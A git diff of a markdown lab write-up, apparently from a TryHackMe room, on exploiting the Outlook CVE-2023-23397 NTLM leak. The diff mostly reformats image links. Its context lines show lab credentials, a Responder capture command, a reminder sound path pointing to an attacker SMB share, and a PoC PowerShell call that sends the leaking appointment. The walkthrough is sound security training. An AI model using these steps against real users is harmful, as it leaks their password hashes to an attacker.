@@ -47,16 +47,16 @@ Command:
 xfreerdp /v:10.10.200.239 /u:Administrator /p:Password321 +clipboard
 ```
 
-![[./img/outlook_ntlm/Pasted image 20230608133244.png]]
+![](./img/outlook_ntlm/Pasted image 20230608133244.png)
 
 Once connected, we will start outlook.
 
-![[./img/outlook_ntlm/Pasted image 20230608133348.png]]
+![](./img/outlook_ntlm/Pasted image 20230608133348.png)
 
 
-![[./img/outlook_ntlm/Pasted image 20230608133744.png]]
+![](./img/outlook_ntlm/Pasted image 20230608133744.png)
 
-![[./img/outlook_ntlm/Pasted image 20230608133822.png]]
+![](./img/outlook_ntlm/Pasted image 20230608133822.png)
 
 You can specify the audio file played when a user gets a notification reminder for a calendar meeting or event. Typically, this would be used for a user to set up their own notifications by pointing to an audio file:
 
@@ -74,7 +74,7 @@ UNC is used in Windows operating systems to find network resources (files, print
 When the victim receives the malicious email, the UNC path directs them to that SMB share, triggering the vulnerability. This causes the system to start an NTLM authentication process against the attacker's machine, leaking a Net-NTLMv2 hash that the attacker can later try to crack.
 
 
-![[./img/outlook_ntlm/Pasted image 20230608134032.png]]
+![](./img/outlook_ntlm/Pasted image 20230608134032.png)
 
 
 
@@ -105,7 +105,7 @@ sudo responder -I tun0
 
 ```
 
-![[./img/outlook_ntlm/Pasted image 20230608134817.png]]
+![]()./img/outlook_ntlm/Pasted image 20230608134817.png)
 
 
 We are now ready to trigger an authentication attempt via the Outlook vulnerability.
@@ -113,11 +113,11 @@ We are now ready to trigger an authentication attempt via the Outlook vulnerabil
 
 We can try setting the sound file path to a UNC path that points to our AttackBox and click the OK button like this:
 
-![[./img/outlook_ntlm/Pasted image 20230608135415.png]]
+![](./img/outlook_ntlm/Pasted image 20230608135415.png)
 
 However, Outlook will silently ignore the UNC path and revert to using the default WAV file, which can be confirmed by going back to the Sound dialogue:
 
-![[./img/outlook_ntlm/Pasted image 20230608135548.png]]
+![](./img/outlook_ntlm/Pasted image 20230608135548.png)
 
 Since Outlook isn't expecting users to input a UNC path here, it probably discards our attempt as invalid output. But not all hope is lost!
 
@@ -128,25 +128,25 @@ We can use the OutlookSpy plugin to access all of Outlook's internal parameters 
 
 Before installing the file, we will need to close OUTLOOK.
 
-![[./img/outlook_ntlm/Pasted image 20230608135705.png]]
+![](./img/outlook_ntlm/Pasted image 20230608135705.png)
 
 
-![[./img/outlook_ntlm/Pasted image 20230608140019.png]]
+![](./img/outlook_ntlm/Pasted image 20230608140019.png)
 
 
-![[./img/outlook_ntlm/Pasted image 20230608140054.png]]
+![](./img/outlook_ntlm/Pasted image 20230608140054.png)
 
 
-![[./img/outlook_ntlm/Pasted image 20230608140115.png]]
+![](./img/outlook_ntlm/Pasted image 20230608140115.png)
 
 
-![[./img/outlook_ntlm/Pasted image 20230608140140.png]]
+![](./img/outlook_ntlm/Pasted image 20230608140140.png)
 
 
-![[./img/outlook_ntlm/Pasted image 20230608140208.png]]
+![](./img/outlook_ntlm/Pasted image 20230608140208.png)
 
 
-![[./img/outlook_ntlm/Pasted image 20230608140223.png]]
+![](./img/outlook_ntlm/Pasted image 20230608140223.png)
 
 
 
@@ -156,11 +156,11 @@ After installing Outlookspy, we can restart outlook, set a new appointment and u
 To view our current appointment from OutlookSpy, click the `OutlookSpy` tab and then the `CurrentItem` button in the taskbar:
 
 
-![[./img/outlook_ntlm/Pasted image 20230608140733.png]]
+![](./img/outlook_ntlm/Pasted image 20230608140733.png)
 
 
 
-![[./img/outlook_ntlm/Pasted image 20230608140819.png]]
+![](./img/outlook_ntlm/Pasted image 20230608140819.png)
 
 
 
@@ -181,7 +181,7 @@ AppointmentItem.ReminderSoundFile = "\\10.8.78.131\nonexistent\sound.wav"
 
 ```
 
-![[./img/outlook_ntlm/Pasted image 20230608141505.png]]
+![](./img/outlook_ntlm/Pasted image 20230608141505.png)
 
 
 Tip: 
@@ -193,29 +193,29 @@ You can go back to the `Properties` tab to check that the values were correctly 
 Finally, save your appointment to add it to your calendar, making sure the reminder is set to 0 minutes and that the appointment matches the current time and date, as we want it to trigger immediately:
 
 
-![[./img/outlook_ntlm/Pasted image 20230608142141.png]]
+![](./img/outlook_ntlm/Pasted image 20230608142141.png)
 
 
 
-![[./img/outlook_ntlm/Pasted image 20230608142302.png]]
+![](./img/outlook_ntlm/Pasted image 20230608142302.png)
 
 
 If all went as expected, you should immediately see a reminder popping up:
 
-![[./img/outlook_ntlm/Pasted image 20230608142335.png]]
+![](./img/outlook_ntlm/Pasted image 20230608142335.png)
 
 
 
 And you should receive the authentication attempt in your Responder console on your AttackBox:
 
-![[./img/outlook_ntlm/Pasted image 20230608142351.png]]
+![](./img/outlook_ntlm/Pasted image 20230608142351.png)
 
 
 #### The Exploit
 
 URL: https://github.com/api0cradle/CVE-2023-23397-POC-Powershell
 
-![[./img/outlook_ntlm/Pasted image 20230608144037.png]]
+![](./img/outlook_ntlm/Pasted image 20230608144037.png)
 
 
 Next we will use the  Powershell exploit to leverage Outlook's COM objects to build emails and appointments easily. It contains a couple of functions that we can use:
@@ -239,7 +239,7 @@ Send-CalendarNTLMLeak -recipient "test@thm.loc" -remotefilepath "\\10.8.78.131\f
 ```
 
 
-![[./img/outlook_ntlm/Pasted image 20230608144540.png]]
+![](./img/outlook_ntlm/Pasted image 20230608144540.png)
 
 
 
@@ -253,15 +253,15 @@ Make sure to press Allow as many times as needed.
 Marking the "Allow access for 10 minutes" checkbox should also help speed this process up:
 
 
-![[./img/outlook_ntlm/Pasted image 20230608144717.png]]
+![](./img/outlook_ntlm/Pasted image 20230608144717.png)
 
 
 
 
-![[./img/outlook_ntlm/Pasted image 20230608144744.png]]
+![](./img/outlook_ntlm/Pasted image 20230608144744.png)
 
 
-![[./img/outlook_ntlm/Pasted image 20230608144803.png]]
+![](./img/outlook_ntlm/Pasted image 20230608144803.png)
 
 
 
